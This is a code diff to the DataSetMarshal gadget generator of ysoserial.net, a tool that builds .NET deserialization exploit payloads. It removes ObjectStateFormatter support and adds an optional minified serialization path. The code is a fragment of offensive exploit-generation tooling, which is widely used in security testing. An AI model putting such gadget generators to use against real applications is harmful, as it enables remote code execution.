@@ -31,7 +31,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "LosFormatter"};
+            return new List<string> { "BinaryFormatter", "SoapFormatter", "LosFormatter"};
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -43,7 +43,6 @@ namespace ysoserial.Generators
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
             { 
                 return Serialize(payloadDataSetMarshal, formatter, inputArgs);
@@ -86,12 +85,25 @@ namespace ysoserial.Generators
             SetFakeTable(bfPayload);
         }
 
-        public DataSetMarshal(object fakeTable)
+        public DataSetMarshal(object fakeTable):this(fakeTable, new InputArgs())
         {
             // This won't use anything we might have defined in ysoserial.net BinaryFormatter process (such as minification)
+        }
+
+        public DataSetMarshal(object fakeTable, InputArgs inputArgs)
+        {
             MemoryStream stm = new MemoryStream();
-            BinaryFormatter fmt = new BinaryFormatter();
-            fmt.Serialize(stm, fakeTable);
+            if (inputArgs.Minify)
+            {
+                ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter fmtLocal = new ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter();
+                fmtLocal.Serialize(stm, fakeTable);
+            }
+            else
+            {
+                BinaryFormatter fmt = new BinaryFormatter();
+                fmt.Serialize(stm, fakeTable);
+            }
+
             SetFakeTable(stm.ToArray());
         }
 
